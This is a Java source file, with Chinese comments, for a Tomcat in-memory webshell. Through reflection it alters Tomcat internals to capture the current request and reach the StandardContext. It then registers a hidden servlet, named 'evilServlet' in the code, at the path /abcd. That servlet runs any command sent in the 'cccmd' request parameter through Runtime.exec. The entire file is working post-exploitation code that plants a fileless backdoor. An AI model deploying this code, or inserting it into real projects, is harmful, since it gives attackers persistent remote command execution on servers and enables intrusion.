import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
public class AddServlet implements Servlet{
    String name = "DefaultServlet";
    String injectURL = "/abcd";
    String shellParameter = "cccmd";

    AddServlet(){
        try {
            java.lang.Class applicationDispatcher = java.lang.Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field WRAP_SAME_OBJECT = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            WRAP_SAME_OBJECT.setAccessible(true);
            if (!WRAP_SAME_OBJECT.getBoolean(null)) {
                WRAP_SAME_OBJECT.setBoolean(null, true);
            }

            //初始化 lastServicedRequest
            java.lang.Class applicationFilterChain = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
            modifiersField = lastServicedRequest.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedRequest.setAccessible(true);
            if (lastServicedRequest.get(null) == null) {
                lastServicedRequest.set(null, new ThreadLocal<>());
            }

            //初始化 lastServicedResponse
            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");
            modifiersField = lastServicedResponse.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedResponse.setAccessible(true);
            if (lastServicedResponse.get(null) == null) {
                lastServicedResponse.set(null, new ThreadLocal<>());
            }

            java.lang.reflect.Field lastServicedRequest2 = applicationFilterChain.getDeclaredField("lastServicedRequest");
            lastServicedRequest2.setAccessible(true);
            java.lang.ThreadLocal thredLocal = (java.lang.ThreadLocal) lastServicedRequest2.get(null);


            /*shell注入，前提需要能拿到request、response等*/
            if (thredLocal != null && thredLocal.get() != null) {
                javax.servlet.ServletRequest servletRequest = (javax.servlet.ServletRequest) thredLocal.get();
                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();

                Field appctx = servletContext.getClass().getDeclaredField("context");  // 获取属性
                appctx.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  //从servletContext中获取context属性->applicationContext

                Field stdctx = applicationContext.getClass().getDeclaredField("context");  // 获取属性
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  // 从applicationContext中获取context属性->standardContext，applicationContext构造时需要传入standardContext
                AddServlet evilServlet = new AddServlet("aaa");

                // 创建并配置wrapper
                org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
                evilWrapper.setName(this.name);
                evilWrapper.setLoadOnStartup(1);

                evilWrapper.setServlet(evilServlet);
                evilWrapper.setServletClass(evilServlet.getClass().getName());

                // 将wrapper添加到children中
                standardContext.addChild(evilWrapper);

                // 添加mapping内容
                standardContext.addServletMapping(this.injectURL, this.name);
            }
        } catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
        e.printStackTrace();
        }
    }

    public AddServlet(String aaa) {

    }

    @Override
    public void init(ServletConfig config) throws ServletException {
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request1 = (HttpServletRequest) req;
        HttpServletResponse response1 = (HttpServletResponse) res;
        if (request1.getParameter(this.shellParameter) != null){
            Runtime.getRuntime().exec(request1.getParameter(this.shellParameter));
            // 进一步施工，回显
        }
        else{
            response1.sendError(404);
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
